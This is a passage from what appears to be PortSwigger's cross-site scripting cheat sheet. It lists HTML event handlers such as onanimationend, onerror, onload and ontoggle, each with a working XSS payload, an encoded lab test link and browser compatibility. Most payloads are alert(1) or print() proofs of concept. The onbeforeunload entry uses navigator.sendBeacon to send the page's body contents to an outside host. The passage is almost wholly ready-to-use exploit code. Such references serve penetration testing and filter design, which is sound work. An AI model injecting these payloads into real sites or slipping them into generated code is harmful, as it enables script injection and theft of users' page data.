Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonanimationend\n\nFires when a CSS animation ends\n\n [`<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-name%3Ax%22%20onanimationend%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onanimationend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonanimationiteration\n\nFires when a CSS animation repeats\n\n [`<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onanimationiteration)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonanimationstart\n\nFires when a CSS animation starts\n\n [`<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-name%3Ax%22%20onanimationstart%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onanimationstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforeprint\n\nFires before the page is printed\n\n [`<body onbeforeprint=console.log(1)>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22print%28%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onbeforeprint%3Dconsole.log%281%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforeprint)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforescriptexecute\n\nFires before script is executed\n\n [`<xss onbeforescriptexecute=alert(1)><script>1</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onbeforescriptexecute%3Dalert%281%29%3E%3Cscript%3E1%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforescriptexecute)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforeunload\n\nFires after if the url changes\n\n [`<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onbeforeunload%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforeunload)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbegin\n\nFires when a svg animation begins\n\n [`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbegin)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncanplay\n\nFires if the resource can be played\n\n [`<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20oncanplay%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncanplay)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncanplaythrough\n\nFires when enough data has been loaded to play the resource all the way through\n\n [`<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%20oncanplaythrough%3Dalert%281%29%3E%3Csource%20src%3D%22validvideo.mp4%22%20type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncanplaythrough)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncuechange\n\nFires when subtitle changes\n\n [``` <video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=\"data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> \"></video> ```](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%20controls%3E%3Csource%20src%3Dvalidvideo.mp4%20type%3Dvideo%2Fmp4%3E%3Ctrack%20default%20oncuechange%3Dalert%281%29%20src%3D%22data%3Atext%2Fvtt%2CWEBVTT%20FILE%0A%0A1%0A00%3A00%3A00.000%20--%3E%2000%3A00%3A05.000%20%0A%3Cb%3EXSS%3C%2Fb%3E%0A%22%3E%3C%2Fvideo%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncuechange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondurationchange\n\nFires when duration changes\n\n [`<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20ondurationchange%3Dalert%281%29%3E%3Csource%20src%3Dvalidaudio.mp3%20type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondurationchange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonend\n\nFires when a svg animation ends\n\n [`<svg><animate onend=alert(1) attributeName=x dur=1s>`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20onend%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonended\n\nFires when the resource is finished playing\n\n [`<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20autoplay%20onended%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onended)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonerror\n\nFires when the resource fails to load or causes an error\n\n [`<audio src/onerror=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20src%2Fonerror%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onerror)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonfocus\n\nFires when the element has focus\n\n [`<a id=x tabindex=1 onfocus=alert(1)></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fa%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocus)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonfocus(autofocus)\n\nFires when a element has focus and the autofocus attribute is used to focus automatically.\n\n [`<xss onfocus=alert(1) autofocus tabindex=1>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onfocus%3Dalert%281%29%20autofocus%20tabindex%3D1%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocus\\(autofocus\\))\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonfocusin\n\nFires when the element has focus\n\n [`<a id=x tabindex=1 onfocusin=alert(1)></a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20id%3Dx%20tabindex%3D1%20onfocusin%3Dalert%281%29%3E%3C%2Fa%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocusin)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonhashchange\n\nFires if the hash changes\n\n [`<body onhashchange=\"print()\">`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dprint%28%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onhashchange%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onhashchange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonload\n\nFires when the element is loaded\n\n [`<body onload=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onload%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onload)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonloadeddata\n\nFires when the first frame is loaded\n\n [`<audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20onloadeddata%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onloadeddata)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonloadedmetadata\n\nFires when the meta data is loaded\n\n [`<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20onloadedmetadata%3Dalert%281%29%3E%20%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onloadedmetadata)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonloadstart\n\nTriggered video is loaded\n\n [`<video onloadstart=\"alert(1)\"><source></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%20onloadstart%3D%22alert%281%29%22%3E%3Csource%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onloadstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmessage\n\nFires when message event is received from a postMessage call\n\n [`<body onmessage=print()>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22this.contentWindow.postMessage%28%27%27%2C%27%2A%27%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onmessage%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onmessage)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpageshow\n\nFires when the page is shown\n\n [`<body onpageshow=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onpageshow%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpageshow)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonplay\n\nFires when the resource is played\n\n [`<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20onplay%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onplay)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonplaying\n\nFires the resource is playing\n\n [`<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20autoplay%20onplaying%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onplaying)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonpopstate\n\nFires when the history changes\n\n [`<body onpopstate=print()>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onpopstate%3Dprint%281%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonprogress\n\nFires when the video/audio begins downloading\n\n [`<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20onprogress%3Dalert%281%29%3E%3Csource%20src%3Dvalidaudio.mp3%20type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onprogress)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonrepeat\n\nFires when a svg animation repeats\n\n [`<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />`](https://portswigger-labs.net/xss/xss.php?x=%3Csvg%3E%3Canimate%20onrepeat%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%20repeatCount%3D2%20%2F%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onrepeat)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonresize\n\nFires when the window is resized\n\n [`<body onresize=\"print()\">`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22this.style.width%3D%271000px%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onresize%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onresize)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonscroll\n\nFires when the page scrolls\n\n [`<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onscroll%3Dalert%281%29%3E%3Cdiv%20style%3Dheight%3A1000px%3E%3C%2Fdiv%3E%3Cdiv%20id%3Dx%3E%3C%2Fdiv%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onscroll)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonscrollend\n\nFires when the scrolling to the end of the element\n\n [`<xss onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onscrollend%3Dalert%281%29%20style%3D%22display%3Ablock%3Boverflow%3Aauto%3Bborder%3A1px%20dashed%3Bwidth%3A500px%3Bheight%3A100px%3B%22%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cspan%20id%3Dx%3Etest%3C%2Fspan%3E%3C%2Fxss%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onscrollend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonsuspend\n\nFires when the video/audio when the data loading is suspended\n\n [`<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20onsuspend%3Dalert%281%29%3E%3Csource%20src%3Dvalidaudio.mp3%20type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onsuspend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontimeupdate\n\nFires when the timeline is changed\n\n [`<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20controls%20autoplay%20ontimeupdate%3Dalert%281%29%3E%3Csource%20src%3D%22validaudio.wav%22%20type%3D%22audio%2Fwav%22%3E%3C%2Faudio%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontimeupdate)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontoggle\n\nFires when the details tag is expanded\n\n [`<details ontoggle=alert(1) open>test</details>`](https://portswigger-labs.net/xss/xss.php?x=%3Cdetails%20ontoggle%3Dalert%281%29%20open%3Etest%3C%2Fdetails%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontoggle)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontransitioncancel\n\nFires when a CSS transition cancels\n\n [`<style>:target {color: red;}</style><xss id=x style=\"transition:color 10s\" ontransitioncancel=print()></xss>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22var%20that%3Dthis%3BsetTimeout%28function%28%29%7Bthat.src%3Dthat.src.replace%28%27%23%27%2C%27%23x%27%29%7D%2C500%29%3BsetTimeout%28x%3D%3Ethat.src%3Dthat.src.replace%28%27%23x%27%2C%27%23%27%29%2C1000%29%3B%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxss%20id%3Dx%20style%3D%2522transition%3Acolor%2010s%2522%20ontransitioncancel%3Dprint%28%29%3Etest%3C%2Fxss%3E%23%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitioncancel)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontransitionend\n\nFires when a CSS transition ends\n\n [`<xss id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20id%3Dx%20style%3D%22transition%3Aoutline%201s%22%20ontransitionend%3Dalert%281%29%20tabindex%3D1%3E%3C%2Fxss%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitionend)\n\nCompatibility:\n\n![Does work in 